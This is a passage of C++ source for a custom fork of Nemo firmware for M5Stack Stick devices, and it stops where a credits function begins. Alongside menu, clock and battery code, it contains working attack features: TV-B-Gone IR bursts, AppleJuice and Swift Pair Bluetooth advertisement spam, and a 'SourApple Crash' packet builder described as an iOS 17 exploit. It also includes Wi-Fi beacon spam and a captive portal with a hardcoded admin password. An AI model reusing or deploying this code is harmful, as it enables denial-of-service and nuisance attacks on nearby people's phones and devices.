// Nemo+ Custom Firmware for the M5 Stack Stick C Plus
// Fork Nemo Firmware with custons for the M5 Stack Stick C Plus
// github.com/n0xa - Original Project | IG: @4x0nn
// github.com/jaajr - Fork Custom Project | IG: @4x0nn


////////////////////////////////// GLOBALS DEFINITIONS //////////////////////////////////

// -=-=-=-=-=-=- Uncomment the platform you're building for -=-=-=-=-=-=-
//#define STICK_C_PLUS
#define STICK_C
//#define CARDPUTER
// -=-=- Uncommenting more than one at a time will result in errors -=-=-

// Language definitions captive portal
//#define ENGLISH
//#define SPANISH
//#define PORTUGUESE

// define admin password to captive portal
const char *adminPassword = "admin12345";

////////////////////////////////// DONT CHANGE NOTHING DOWN ///////////////////////////

String buildver="Custom 1.0.0";

#define BGCOLOR BLACK
#define WHCOLOR WHITE

#if defined(STICK_C_PLUS)
  #include <M5StickCPlus.h>
  // -=-=- Display -=-=-
  String platformName="StickC+";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define M5LED
  #define RTC
  #define AXP
  #define ACTIVE_LOW_IR
  #define ROTATION
  #define USE_EEPROM
  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
#endif

#if defined(STICK_C)
  #include <M5StickC.h>
  // -=-=- Display -=-=-
  String platformName="StickC";
  #define BIG_TEXT 2
  #define MEDIUM_TEXT 2
  #define SMALL_TEXT 1
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define M5LED
  #define RTC
  #define AXP
  #define ROTATION
  #define USE_EEPROM
  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
#endif

#if defined(CARDPUTER)
  #include <M5Cardputer.h>
  // -=-=- Display -=-=-
  String platformName="Cardputer";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define KB
  #define HID
  // -=-=- ALIASES -=-=-
  #define DISP M5Cardputer.Display
#endif

// -=-=-=-=-=- LIST OF CURRENTLY DEFINED FEATURES -=-=-=-=-=-
// M5LED      - An LED exposed as M5_LED
// RTC        - Real-time clock exposed as M5.Rtc 
// AXP        - AXP192 Power Management exposed as M5.Axp
// KB         - Keyboard exposed as M5Cardputer.Keyboard
// HID        - HID exposed as USBHIDKeyboard
// USE_EEPROM - Store settings in EEPROM
// ROTATION   - Allow screen to be rotated
// DISP       - Set to the API's Display class

#include <IRremoteESP8266.h>
#include <IRsend.h>
#include "applejuice.h"
#include "WORLD_IR_CODES.h"
#include "wifispam.h"
#include <BLEUtils.h>
#include <BLEServer.h>

// INCLUDES CAPTIVE PORTAL //

#include <EEPROM.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

////////////

int advtime = 0; 
int cursor = 0;
int wifict = 0;
int brightness = 100;
int ajDelay = 1000;
bool rstOverride = false; // Reset Button Override. Set to true when navigating menus.
bool sourApple = false;   // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
bool swiftPair = false;   // Internal flag to place AppleJuice into Swift Pair random packet Mode
bool maelstrom = false;   // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
#if defined(USE_EEPROM)
  #include <EEPROM.h>
  #define EEPROM_SIZE 4
#endif
struct MENU {
  char name[19];
  int command;
};

/// SWITCHER ///
// Proc codes
// 0  - Clock
// 1  - Main Menu
// 2  - Settings Menu
// 3  - Clock set
// 4  - Dimmer Time adjustment
// 5  - TV B-GONE
// 6  - Battery info
// 7  - screen rotation
// 8  - AppleJuice Menu
// 9  - AppleJuice Advertisement
// 10 - Credits 
// 11 - Wifi beacon spam
// 12 - Wifi spam menu
// 13 - TV-B-Gone Region Setting
// 14 - Wifi scanning
// 15 - Wifi scan results
// 16 - Bluetooth Spam Menu
// 17 - Bluetooth Maelstrom
// 18 - 
// 20 - Captive Portal


bool isSwitching = true;
#if defined(RTC)
  int current_proc = 0; // Start in Clock Mode
#else
  int current_proc = 1; // Start in Main Menu mode if no RTC
#endif

void switcher_button_proc() {
  if (rstOverride == false) {
    if (check_next_press()) {
      isSwitching = true;
      current_proc = 1;
    }
  }
}

#if defined(KB)
  void check_kb(){
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      delay(100);
    }
  }
#endif
// Tap the power button from pretty much anywhere to get to the main menu
void check_menu_press() {
#if defined(AXP)
  if (M5.Axp.GetBtnPress()) {
#endif
#if defined(KB)
  if (M5Cardputer.Keyboard.isKeyPressed(',') || M5Cardputer.Keyboard.isKeyPressed('`')){
#endif
    isSwitching = true;
    rstOverride = false;
    current_proc = 1;
    delay(100);
  }
}

bool check_next_press(){
#if defined(KB)
  if (M5Cardputer.Keyboard.isKeyPressed(';')){
    // hack to handle the up arrow
    cursor = cursor - 2;
    check_kb();
    return true;
  }
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')){
    check_kb();
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_RST) == LOW){
    return true;
  }
#endif
  return false;
}

bool check_select_press(){
#if defined(KB)
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')){
    
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_HOME) == LOW){
    return true;
  }
#endif
  return false;
}

/// MAIN MENU ///
MENU mmenu[] = {
#if defined(RTC)
  { "Clock", 0},
#endif
  { "TV-B-Gone", 13}, // We jump to the region menu first
  { "Bluetooth", 16},
  { "WiFi", 12},
  //{ "QR Codes", 18},
  { "Settings", 2},
  { "Captive Portal", 20},
};

void mmenu_drawmenu() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(mmenu) / sizeof(MENU) ) ; i++ ) {
    DISP.print((cursor == i) ? ">" : " ");
    DISP.println(mmenu[i].name);
  }
}

void mmenu_setup() {
  cursor = 0;
  rstOverride = true;
  mmenu_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void mmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( sizeof(mmenu) / sizeof(MENU) );
    mmenu_drawmenu();
    delay(250);
  }
  if (check_select_press()) {
    rstOverride = false;
    isSwitching = true;
    current_proc = mmenu[cursor].command;
  }
}

#if defined(AXP) && defined(RTC)
  //Screen dimming needs both AXP and RTC features
  bool pct_brightness = true;  /* set to false if the screen goes
                              to full brightness over level 2.
                              Useful range is about 7-15.
                              Set to true if the screen is too
                              dim no matter what level is set.
                              Some versions of the M5Stack lib
                              have a percentage range 0-100. */

  bool screen_dim_dimmed = false;
  int screen_dim_time = 30;
  int screen_dim_current = 0;

  void screen_dim_proc() {
    M5.Rtc.GetBm8563Time();
    // if one of the buttons is pressed, take the current time and add screen_dim_time on to it and roll over when necessary
    if (check_next_press() || check_select_press()) {
      if (screen_dim_dimmed) {
        screen_dim_dimmed = false;
        M5.Axp.ScreenBreath(brightness);
      }
      int newtime = M5.Rtc.Second + screen_dim_time + 2; // hacky but needs a couple extra seconds added

      if (newtime >= 60) {
        newtime = newtime - 60;
      }
      screen_dim_current = newtime;
    }
    if (screen_dim_dimmed == false) {
      if (M5.Rtc.Second == screen_dim_current || (M5.Rtc.Second + 1) == screen_dim_current || (M5.Rtc.Second + 2) == screen_dim_current) {
        M5.Axp.ScreenBreath(10);
        screen_dim_dimmed = true;
      }
    }
  }

  /// Dimmer MENU ///
  
  MENU dmenu[] = {
    { "Back", screen_dim_time},
    { "5 seconds", 5},
    { "10 seconds", 10},
    { "15 seconds", 15},
    { "20 seconds", 20},
    { "25 seconds", 25},
    { "30 seconds", 30},
  };

  void dmenu_drawmenu() {
    DISP.setTextSize(SMALL_TEXT);
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 8, 1);
    for ( int i = 0 ; i < ( sizeof(dmenu) / sizeof(MENU) ) ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(dmenu[i].name);
    }
  }

  void dmenu_setup() {
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 5, 1);
    DISP.println("SET AUTO DIM TIME");
    delay(1000);
    cursor = (screen_dim_time / 5) - 1;
    rstOverride = true;
    dmenu_drawmenu();
    delay(500); // Prevent switching after menu loads up
  }

  void dmenu_loop() {
    if (check_next_press()) {
      cursor++;
      cursor = cursor % ( sizeof(dmenu) / sizeof(MENU) );
      dmenu_drawmenu();
      delay(250);
    }
    if (check_select_press()) {
      screen_dim_time = dmenu[cursor].command;
      #if defined(USE_EEPROM)
        EEPROM.write(1, screen_dim_time);
        EEPROM.commit();
      #endif
      DISP.fillScreen(BGCOLOR);
      DISP.setCursor(0, 5, 1);
      DISP.println("SET BRIGHTNESS");
      delay(1000);
      if(pct_brightness){
        cursor = brightness / 10;
      } else {
        cursor = brightness + 5;
      }
      timeset_drawmenu(11);
      while( !check_select_press()) {
        if (check_next_press()) {
          cursor++;
          cursor = cursor % 11 ;
          timeset_drawmenu(11);
          if(pct_brightness){
            M5.Axp.ScreenBreath(10 * cursor);
          } else {
            M5.Axp.ScreenBreath(5 + cursor);
          }
          delay(250);
         }
      }
      if(pct_brightness){
        brightness = cursor * 10;
      } else {
        brightness = cursor + 5;
      }
     M5.Axp.ScreenBreath(brightness);
      #if defined(USE_EEPROM)
        EEPROM.write(2, brightness);
        EEPROM.commit();
      #endif
      rstOverride = false;
      isSwitching = true;
      current_proc = 2;
    }
  }
#endif //AXP / RTC Dimmer

///////////// END DIMMER //////////////

/// SETTINGS MENU ///

MENU smenu[] = {
  { "Back", 1},
#if defined(AXP)
  { "Battery Info", 6},
  { "Brightness", 4},
#endif
#if defined(RTC)
  { "Set Clock", 3},
#endif
#if defined(ROTATION)
  { "Rotation", 7},
#endif
  { "About", 10},
#if defined(USE_EEPROM)
  { "Clear Settings", 99},
#endif
};

void smenu_drawmenu() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(smenu) / sizeof(MENU) ) ; i++ ) {
    DISP.print((cursor == i) ? ">" : " ");
    DISP.println(smenu[i].name);
  }
}

void smenu_setup() {
  cursor = 0;
  rstOverride = true;
  smenu_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void smenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( sizeof(smenu) / sizeof(MENU) );
    smenu_drawmenu();
    delay(250);
  }
  if (check_select_press()) {
    rstOverride = false;
    isSwitching = true;
    if(smenu[cursor].command == 99){
#if defined(USE_EEPROM)
      EEPROM.write(0, 255); // Rotation
      EEPROM.write(1, 255); // dim time
      EEPROM.write(2, 255); // brightness
      EEPROM.write(2, 255); // TV-B-Gone Region
      EEPROM.commit();
#endif
      ESP.restart();
    }
    current_proc = smenu[cursor].command;
  }
}

int rotation = 1;
#if defined(ROTATION)
  /// Rotation MENU ///
  MENU rmenu[] = {
    { "Back", rotation},
    { "Right", 1},
    { "Left", 3},
  };

  void rmenu_drawmenu() {
    DISP.setTextSize(SMALL_TEXT);
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 8, 1);
    for ( int i = 0 ; i < ( sizeof(rmenu) / sizeof(MENU) ) ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(rmenu[i].name);
    }
  }

  void rmenu_setup() {
    cursor = 0;
    rstOverride = true;
    rmenu_drawmenu();
    delay(500); // Prevent switching after menu loads up
  }

  void rmenu_loop() {
    if (check_next_press()) {
      cursor++;
      cursor = cursor % ( sizeof(rmenu) / sizeof(MENU) );
      rmenu_drawmenu();
      delay(250);
    }
    if (check_select_press()) {
      rstOverride = false;
      isSwitching = true;
      rotation = rmenu[cursor].command;
      DISP.setRotation(rotation);
      #if defined(USE_EEPROM)
        EEPROM.write(0, rotation);
        EEPROM.commit();
      #endif
      current_proc = 2;
    }
  }
#endif //ROTATION

///////////////// END ROTATION DISPLAY ////////////////

#if defined(AXP)
  /// BATTERY INFO ///
  void battery_drawmenu(int battery, int b, int c) {
    DISP.setTextSize(SMALL_TEXT);
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 8, 1);
    DISP.print("Battery: ");
    DISP.print(battery);
    DISP.println("%");
    DISP.print("DeltaB: ");
    DISP.println(b);
    DISP.print("DeltaC: ");
    DISP.println(c);
    DISP.println("");
    DISP.println("Press any button to exit");
  }
  void battery_setup() {
    rstOverride = false;
    float c = M5.Axp.GetVapsData() * 1.4 / 1000;
    float b = M5.Axp.GetVbatData() * 1.1 / 1000;
    int battery = ((b - 3.0) / 1.2) * 100;
    battery_drawmenu(battery, b, c);
    delay(500); // Prevent switching after menu loads up
  }

  void battery_loop() {
    delay(300);
    float c = M5.Axp.GetVapsData() * 1.4 / 1000;
    float b = M5.Axp.GetVbatData() * 1.1 / 1000;
    int battery = ((b - 3.0) / 1.2) * 100;
    battery_drawmenu(battery, b, c);
    if (check_select_press()) {
      rstOverride = false;
      isSwitching = true;
      current_proc = 1;
    }
  }
#endif // AXP

///////////////// END BATYERY INFO ////////////////


/// TV-B-GONE ///
void tvbgone_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(SMALL_TEXT);
  irsend.begin();
  // Hack: Set IRLED high to turn it off after setup. Otherwise it stays on (active low)
  digitalWrite(IRLED, HIGH);

  delay_ten_us(5000);
  if(region == NA) {
    DISP.print("Region:\nAmericas / Asia\n");
  }
  else {
    DISP.println("Region: EMEA");
  }
  DISP.println("Select: Go/Pause");
  DISP.println("Next: Exit");
  delay(1000);
}

void tvbgone_loop()
{
  if (check_select_press()) {
    delay(250);
    Serial.println("triggered TVBG");
    sendAllCodes();
  }
}

/// TVBG-Region MENU ///
MENU tvbgmenu[] = {
  { "Back", 3},
  { "Americas / Asia", 0},
  { "EU/MidEast/Africa", 1},
};

void tvbgmenu_drawmenu() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(tvbgmenu) / sizeof(MENU) ) ; i++ ) {
    DISP.print((cursor == i) ? ">" : " ");
    DISP.println(tvbgmenu[i].name);
  }
}

void tvbgmenu_setup() {  
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.println("Region");
  cursor = region % 2;
  rstOverride = true;
  delay(1000); 
  tvbgmenu_drawmenu();
}

void tvbgmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( sizeof(tvbgmenu) / sizeof(MENU) );
    tvbgmenu_drawmenu();
    delay(250);
  }
  if (check_select_press()) {
    region = tvbgmenu[cursor].command;

    if (region == 3) {
      current_proc = 1;
      isSwitching = true;
      rstOverride = false; 
      return;
    }

    #if defined(USE_EEPROM)
      EEPROM.write(3, region);
      EEPROM.commit();
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 5;
  }
}

void sendAllCodes() {
  bool endingEarly = false; //will be set to true if the user presses the button during code-sending
  if (region == NA) {
    num_codes = num_NAcodes;
  } else {
    num_codes = num_EUcodes;
  }
  for (i = 0 ; i < num_codes; i++)
  {
    if (region == NA) {
      powerCode = NApowerCodes[i];
    }
    else {
      powerCode = EUpowerCodes[i];
    }
    const uint8_t freq = powerCode->timer_val;
    const uint8_t numpairs = powerCode->numpairs;
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(BIG_TEXT);
    DISP.setCursor(5, 1);
    DISP.println("TV-B-Gone");
    DISP.setTextSize(SMALL_TEXT);
    DISP.println("Front Key: Go/Pause");
    const uint8_t bitcompression = powerCode->bitcompression;
    code_ptr = 0;
    for (uint8_t k = 0; k < numpairs; k++) {
      uint16_t ti;
      ti = (read_bits(bitcompression)) * 2;
      #if defined(ACTIVE_LOW_IR)
        offtime = powerCode->times[ti];  // read word 1 - ontime
        ontime = powerCode->times[ti + 1]; // read word 2 - offtime
      #else
        ontime = powerCode->times[ti];  // read word 1 - ontime
        offtime = powerCode->times[ti + 1]; // read word 2 - offtime      
      #endif
      DISP.setTextSize(TINY_TEXT);
      DISP.printf("rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
      Serial.printf("TVBG: rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
      rawData[k * 2] = offtime * 10;
      rawData[(k * 2) + 1] = ontime * 10;
    }
    irsend.sendRaw(rawData, (numpairs * 2) , freq);
    #if defined(ACTIVE_LOW_IR)
      // Set Active Low IRLED high to turn it off after each burst.
      digitalWrite(IRLED, HIGH);
    #endif
    bitsleft_r = 0;
    delay_ten_us(20500);
    #if defined(AXP)
    if (M5.Axp.GetBtnPress()) {
      endingEarly = true;
      current_proc = 1;
      isSwitching = true;
      rstOverride = false; 
      break;     
    }
    #endif
#if defined(KB)
    check_kb();
#endif
    if (check_select_press()){
      Serial.println("endingearly");
      endingEarly = true;
      delay(250);
      break; 
    }
  } 
  if (endingEarly == false)
  {
    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
    quickflashLEDx(8);
  }
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(SMALL_TEXT);
  DISP.println("Select: Go/Pause");
  DISP.println("Next: Exit");
}

////////////// END TV B-GONE //////////////


/// CLOCK ///
#if defined(RTC)
  void clock_setup() {
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(MEDIUM_TEXT);
  }

  void clock_loop() {
    M5.Rtc.GetBm8563Time();
    DISP.setCursor(40, 40, 2);
    DISP.printf("%02d:%02d:%02d\n", M5.Rtc.Hour, M5.Rtc.Minute, M5.Rtc.Second);
    delay(250);
  }

  /// TIMESET ///
  void timeset_drawmenu(int nums) {
    DISP.setTextSize(SMALL_TEXT);
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 5, 1);
    // scrolling menu
    if (cursor > 5) {
      for ( int i = 0 + (cursor - 5) ; i < nums ; i++ ) {
        DISP.print((cursor == i) ? ">" : " ");
        DISP.println(i);
      }
    } else {
      for (
        int i = 0 ; i < nums ; i++ ) {
        DISP.print((cursor == i) ? ">" : " ");
        DISP.println(i);
      }
    }
  }

  /// TIME SETTING ///
  void timeset_setup() {
    rstOverride = true;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 5, 1);
    DISP.println("SET HOUR");
    delay(2000);
  }

  void timeset_loop() {
    M5.Rtc.GetBm8563Time();
    cursor = M5.Rtc.Hour;
    timeset_drawmenu(24);
    while(digitalRead(M5_BUTTON_HOME) == HIGH) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % 24 ;
        timeset_drawmenu(24);
        delay(100);
      }
    }
    int hour = cursor;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 5, 1);
    DISP.println("SET MINUTE");
    delay(2000);
    cursor = M5.Rtc.Minute;
    timeset_drawmenu(60);
    while(digitalRead(M5_BUTTON_HOME) == HIGH) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % 60 ;
        timeset_drawmenu(60);
        delay(100);
      }
    }
    int minute = cursor;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 5, 1);
    RTC_TimeTypeDef TimeStruct;
    TimeStruct.Hours   = hour;
    TimeStruct.Minutes = minute;
    TimeStruct.Seconds = 0;
    M5.Rtc.SetTime(&TimeStruct);
    DISP.printf("Setting Time:\n%02d:%02d:00",hour,minute);
    delay(2000);
    rstOverride = false;
    isSwitching = true;
    current_proc = 0;
  }
#endif // RTC

////////////// END CLOCK ///////////////

/// Bluetooth Spamming ///

/// BTSPAM MENU ///
MENU btmenu[] = {
  { "Back", 4},
  { "AppleJuice", 0},
  { "Swift Pair", 1},
  { "SourApple Crash", 2},
  { "BT Maelstrom", 3},
};

void btmenu_drawmenu() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(btmenu) / sizeof(MENU) ) ; i++ ) {
    DISP.print((cursor == i) ? ">" : " ");
    DISP.println(btmenu[i].name);
  }
}

void btmenu_setup() {
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  rstOverride = true;
  btmenu_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void btmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( sizeof(btmenu) / sizeof(MENU) );
    btmenu_drawmenu();
    delay(250);
  }
  if (check_select_press()) {
    int option = btmenu[cursor].command;
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(MEDIUM_TEXT);
    DISP.setCursor(5, 1);
    DISP.println("BT Spam");
    DISP.setTextSize(SMALL_TEXT);
    DISP.print("Advertising:\n");

    switch(option) {
      case 0:
        DISP.fillScreen(BGCOLOR);
        rstOverride = false;
        isSwitching = true;
        current_proc = 8;
        break;
      case 1:
        swiftPair = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print("Swift Pair Random");
        DISP.print("\n\nNext: Exit");
        break;
      case 2:
        sourApple = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print("SourApple Crash");
        DISP.print("\n\nNext: Exit");
        break;
      case 3:
        rstOverride = false;
        isSwitching = true;
        current_proc = 17; // Maelstrom
        DISP.print("Bluetooth Maelstrom\n");
        DISP.print(" Combined BT Spam");
        DISP.print("\n\nNext: Exit");
        break;
      case 4:
        DISP.fillScreen(BGCOLOR);
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
    }
  }
}

MENU ajmenu[] = {
  { "Back", 29},
  { "AirPods", 1},
  { "Transfer Number", 27},
  { "AirPods Pro", 2},
  { "AirPods Max", 3},
  { "AirPods G2", 4},
  { "AirPods G3", 5},
  { "AirPods Pro G2", 6},
  { "PowerBeats", 7},
  { "PowerBeats Pro", 8},
  { "Beats Solo Pro", 9},
  { "Beats Studio Buds", 10},
  { "Beats Flex", 11},
  { "Beats X", 12},
  { "Beats Solo 3", 13},
  { "Beats Studio 3", 14},
  { "Beats Studio Pro", 15},
  { "Beats Fit Pro", 16},
  { "Beats Studio Buds+", 17},
  { "AppleTV Setup", 18},
  { "AppleTV Pair", 19},
  { "AppleTV New User", 20},
  { "AppleTV AppleID", 21},
  { "AppleTV Audio", 22},
  { "AppleTV HomeKit", 23},
  { "AppleTV Keyboard", 24},
  { "AppleTV Network", 25},
  { "TV Color Balance", 26},
  { "Setup New Phone", 28},
};

void aj_drawmenu() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 5, 1);
  // scrolling menu
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < ( sizeof(ajmenu) / sizeof(MENU) ) ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(ajmenu[i].name);
    }
  } else {
    for (
      int i = 0 ; i < ( sizeof(ajmenu) / sizeof(MENU) ) ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(ajmenu[i].name);
    }
  }
}

void aj_setup(){
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("AppleJuice");
  delay(1000);  
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  rstOverride = true;
  aj_drawmenu();
}

void aj_loop(){
  if (!maelstrom){
    if (check_next_press()) {
      cursor++;
      cursor = cursor % ( sizeof(ajmenu) / sizeof(MENU) );
      aj_drawmenu();
      delay(100);
    }
  }
  if (check_select_press() || maelstrom) {
    deviceType = ajmenu[cursor].command;
    if (maelstrom) {
      deviceType = random(1, 28);
    }
    switch(deviceType) {
      case 1:
        data = Airpods;
        break;
      case 2:
        data = AirpodsPro;
        break;
      case 3:
        data = AirpodsMax;
        break;
      case 4:
        data = AirpodsGen2;
        break;
      case 5:
        data = AirpodsGen3;
        break;
      case 6:
        data = AirpodsProGen2;
        break;
      case 7:
        data = PowerBeats;
        break;
      case 8:
        data = PowerBeatsPro;
        break;
      case 9:
        data = BeatsSoloPro;
        break;
      case 10:
        data = BeatsStudioBuds;
        break;
      case 11:
        data = BeatsFlex;
        break;
      case 12:
        data = BeatsX;
        break;
      case 13:
        data = BeatsSolo3;
        break;
      case 14:
        data = BeatsStudio3;
        break;
      case 15:
        data = BeatsStudioPro;
        break;
      case 16:
        data = BeatsFitPro;
        break;
      case 17:
        data = BeatsStudioBudsPlus;
        break;
      case 18:
        data = AppleTVSetup;
        break;
      case 19:
        data = AppleTVPair;
        break;
      case 20:
        data = AppleTVNewUser;
        break;
      case 21:
        data = AppleTVAppleIDSetup;
        break;
      case 22:
        data = AppleTVWirelessAudioSync;
        break;
      case 23:
        data = AppleTVHomekitSetup;
        break;
      case 24:
        data = AppleTVKeyboard;
        break;
      case 25:
        data = AppleTVConnectingToNetwork;
        break;
      case 26:
        data = TVColorBalance;
        break;
      case 27:
        data = TransferNumber;
        break;
      case 28:
        data = SetupNewPhone;
        break;
      case 29:
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
    }
    if (current_proc == 8 && isSwitching == false){
      DISP.fillScreen(BGCOLOR);
      DISP.setTextSize(MEDIUM_TEXT);
      DISP.setCursor(5, 1);
      DISP.println("AppleJuice");
      DISP.setTextSize(SMALL_TEXT);
      DISP.print("Advertising:\n");
      DISP.print(ajmenu[cursor].name);
      DISP.print("\n\nNext: Exit");
      isSwitching = true;
      current_proc = 9; // Jump over to the AppleJuice BLE beacon loop
    }
  }
}

void aj_adv_setup(){
  rstOverride = false;  
}

void aj_adv(){
  // run the advertising loop
  // Isolating this to its own process lets us take advantage 
  // of the background stuff easier (menu button, dimmer, etc)
  rstOverride = true;
  if (sourApple || swiftPair || maelstrom){
    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
    advtime = 0; // bypass ajDelay counter
  }
  if (millis() > advtime + ajDelay){
    advtime = millis();
    pAdvertising->stop(); // This is placed here mostly for timing.
                          // It allows the BLE beacon to run through the loop.
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (sourApple){
      Serial.print("SourApple Advertisement: ");
      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
      // Original credits for algorithm ECTO-1A & WillyJL
      uint8_t packet[17];
      uint8_t size = 17;
      uint8_t i = 0;
      packet[i++] = size - 1;    // Packet Length
      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
      packet[i++] = 0x00;        // ...
      packet[i++] = 0x0F;  // Type
      packet[i++] = 0x05;                        // Length
      packet[i++] = 0xC1;                        // Action Flags
      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
      packet[i++] = types[rand() % sizeof(types)];  // Action Type
      esp_fill_random(&packet[i], 3); // Authentication Tag
      i += 3;
      packet[i++] = 0x00;  // ???
      packet[i++] = 0x00;  // ???
      packet[i++] =  0x10;  // Type ???
      esp_fill_random(&packet[i], 3);
      oAdvertisementData.addData(std::string((char *)packet, 17));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else if (swiftPair) {
      const char* display_name = generateRandomName();
      Serial.printf("SwiftPair Advertisement: '%s' - ", display_name);
      uint8_t display_name_len = strlen(display_name);
      uint8_t size = 7 + display_name_len;
      uint8_t* packet = (uint8_t*)malloc(size);
      uint8_t i = 0;
      packet[i++] = size - 1; // Size
      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
      packet[i++] = 0x06; // Company ID (Microsoft)
      packet[i++] = 0x00; // ...
      packet[i++] = 0x03; // Microsoft Beacon ID
      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
      packet[i++] = 0x80; // Reserved RSSI Byte
      for (int j = 0; j < display_name_len; j++) {
        packet[i + j] = display_name[j];
      }
      for (int i = 0; i < size; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");

      i += display_name_len;  
      oAdvertisementData.addData(std::string((char *)packet, size));
      free(packet);
      free((void*)display_name);
    } else {
      Serial.print("AppleJuice Advertisement: ");
      if (deviceType >= 18){
        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
      } else {
        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
      }
      for (int i = 0; i < sizeof(Airpods); i ++) {
        Serial.printf("%02x", data[i]);
      }      
      Serial.println("");
    }
    
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
#if defined(M5LED)
    digitalWrite(M5_LED, LOW); //LED ON on Stick C Plus
    delay(10);
     digitalWrite(M5_LED, HIGH); //LED OFF on Stick C Plus
#endif
  }
  if (check_next_press()) {
    if (sourApple || swiftPair || maelstrom){
      isSwitching = true;
      current_proc = 16;
      btmenu_drawmenu();
    } else {
      isSwitching = true;
      current_proc = 8;      
      aj_drawmenu();
    }
    sourApple = false;
    swiftPair = false;
    maelstrom = false;
    pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
    delay(250);
  }
}

///////////// END APPLE JUICE /////////////////


/// CREDITS ///
void credits_setup(){
